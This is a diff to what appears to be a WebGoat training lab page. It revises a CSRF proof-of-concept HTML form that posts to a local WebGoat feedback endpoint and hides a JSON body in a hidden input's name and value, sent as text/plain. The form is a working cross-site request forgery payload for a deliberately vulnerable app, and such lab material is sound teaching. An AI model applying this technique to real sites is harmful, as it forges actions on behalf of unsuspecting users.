@@ -17,17 +17,25 @@ The following HTML form can be copied and pasted into an `.html` file and opened
 ```html
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>WebGoat CSRF</title>
+</head>
+
 <body>
+
+<h2>WebGoat CSRF Test</h2>
 
 <form action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message"
       method="POST"
       enctype="text/plain">
 
-    <input name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!","ignoreme":"'
-           value='test"
-           type="hidden">
+    <input
+        type="hidden"
+        name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!","ignoreme":"'
+        value='test"}'>
 
-    <input type="submit" value="Submit">
+    <button type="submit">Submit</button>
 
 </form>
 
